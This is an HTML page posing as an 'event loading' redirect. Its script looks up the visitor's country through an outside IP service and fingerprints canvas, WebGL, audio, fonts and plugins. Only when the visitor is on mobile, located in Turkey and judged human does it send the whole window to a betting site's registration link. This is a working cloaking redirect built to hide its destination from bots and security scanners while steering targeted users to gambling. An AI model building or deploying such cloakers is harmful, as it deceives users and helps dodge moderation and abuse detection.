<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <title>Etkinlik Yönlendirme</title>
  <style>
    body { font-family: sans-serif; text-align: center; margin-top: 50px; }
    pre { background: #f3f3f3; padding: 15px; max-width: 400px; margin: auto; text-align: left; }
  </style>
</head>
<body>
  <h3>Etkinlik yükleniyor...</h3>
  <pre id="log">Debug Log:</pre>

  <script>
    const log = msg => document.getElementById("log").innerText += "\\n" + msg;
    const result = { canvas: false, audio: false, webgl: false, fonts: 0, plugins: 0 };

    async function getIPCountry() {
      try {
        const res = await fetch("https://ipapi.co/json/");
        const data = await res.json();
        log("IP ölkəsi: " + data.country_code);
        return data.country_code === "TR";
      } catch (e) {
        log("IP xətası: " + e.message);
        return false;
      }
    }

    function checkFingerprint() {
      try {
        const canvas = document.createElement("canvas");
        const ctx = canvas.getContext("2d");
        ctx.fillText("Test", 10, 10);
        result.canvas = canvas.toDataURL().length > 100;
      } catch {}
      try {
        const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
        result.webgl = !!gl;
      } catch {}
      try {
        const AudioContext = window.AudioContext || window.webkitAudioContext;
        const audioCtx = new AudioContext();
        result.audio = ["running", "suspended"].includes(audioCtx.state);
      } catch {}
      result.fonts = document.fonts ? document.fonts.size || 100 : 100;
      result.plugins = navigator.plugins.length;

      log("Canvas: " + result.canvas);
      log("Audio: " + result.audio);
      log("WebGL: " + result.webgl);
      log("Fonts: " + result.fonts);
      log("Plugins: " + result.plugins);

      return (
        result.canvas &&
        result.audio &&
        result.webgl &&
        result.fonts > 50 &&
        result.plugins > 0
      );
    }

    async function checkAndRedirect() {
      const isMobile = /Mobile|iPhone|Android/i.test(navigator.userAgent);
      log("Mobil cihaz?: " + isMobile);

      const isTR = await getIPCountry();
      const isHuman = checkFingerprint();

      log("İnsan profili?: " + isHuman);

      if (isMobile && isTR && isHuman) {
        log("✅ Yönlendirme başladı!");
        top.location.href = "https://zbahis310.com/Register-1274";
      } else {
        log("❌ Şərtlər ödənmədi.");
      }
    }

    setTimeout(checkAndRedirect, 2000);
  </script>
</body>
</html>
